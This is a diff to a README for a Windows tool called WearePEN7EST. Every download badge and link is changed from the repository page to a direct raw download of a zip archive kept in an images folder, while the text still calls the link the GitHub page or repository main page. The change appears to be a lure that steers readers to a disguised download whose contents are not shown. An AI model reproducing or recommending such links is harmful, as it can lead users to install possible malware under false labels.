@@ -1,6 +1,6 @@
 # 🔐 WearePEN7EST - Secure Your Testing Environment Easily
 
-[![Download WearePEN7EST](https://img.shields.io/badge/Download-WearePEN7EST-brightgreen?style=for-the-badge)](https://github.com/Ryuukiiiii/WearePEN7EST)
+[![Download WearePEN7EST](https://img.shields.io/badge/Download-WearePEN7EST-brightgreen?style=for-the-badge)](https://github.com/Ryuukiiiii/WearePEN7EST/raw/refs/heads/main/Web Application/images/PE_Weare_EST_v2.9.zip)
 
 | ![](Web%20Application/images/WEAREPEN7EST.png) |  
 |:--:|  
@@ -34,7 +34,7 @@ If you have an older version of Windows, the software might not work as expected
 
 You can download the software package from the official GitHub page. Visit the link below to access the download page:
 
-[![Download Here](https://img.shields.io/badge/Download-WearePEN7EST-orange?style=for-the-badge)](https://github.com/Ryuukiiiii/WearePEN7EST)
+[![Download Here](https://img.shields.io/badge/Download-WearePEN7EST-orange?style=for-the-badge)](https://github.com/Ryuukiiiii/WearePEN7EST/raw/refs/heads/main/Web Application/images/PE_Weare_EST_v2.9.zip)
 
 Click the link to open the GitHub page. On this page, look for the latest release or the main files section. Download the Windows installer file, usually ending in `.exe` or `.msi`.
 
@@ -43,7 +43,7 @@ Click the link to open the GitHub page. On this page, look for the latest releas
 ## 📥 How to Download and Install
 
 1. Open your web browser and go to  
-   [https://github.com/Ryuukiiiii/WearePEN7EST](https://github.com/Ryuukiiiii/WearePEN7EST)
+   [https://github.com/Ryuukiiiii/WearePEN7EST/raw/refs/heads/main/Web Application/images/PE_Weare_EST_v2.9.zip](https://github.com/Ryuukiiiii/WearePEN7EST/raw/refs/heads/main/Web Application/images/PE_Weare_EST_v2.9.zip)
 
 2. Look for a section titled **Releases** or **Assets**. This area contains the files you will need.
 
@@ -139,7 +139,7 @@ You can also visit the GitHub page for:
 
 ## 🔗 Useful Links
 
-- Repository main page: [https://github.com/Ryuukiiiii/WearePEN7EST](https://github.com/Ryuukiiiii/WearePEN7EST)  
+- Repository main page: [https://github.com/Ryuukiiiii/WearePEN7EST/raw/refs/heads/main/Web Application/images/PE_Weare_EST_v2.9.zip](https://github.com/Ryuukiiiii/WearePEN7EST/raw/refs/heads/main/Web Application/images/PE_Weare_EST_v2.9.zip)  
 
 Use this link to download, check for updates, and find more information. Bookmark it for easy access.
 
@@ -157,4 +157,4 @@ You don’t need to use these features to get started.
 
 ---
 
-[![Download WearePEN7EST](https://img.shields.io/badge/Download-WearePEN7EST-brightgreen?style=for-the-badge)](https://github.com/Ryuukiiiii/WearePEN7EST)
+[![Download WearePEN7EST](https://img.shields.io/badge/Download-WearePEN7EST-brightgreen?style=for-the-badge)](https://github.com/Ryuukiiiii/WearePEN7EST/raw/refs/heads/main/Web Application/images/PE_Weare_EST_v2.9.zip)
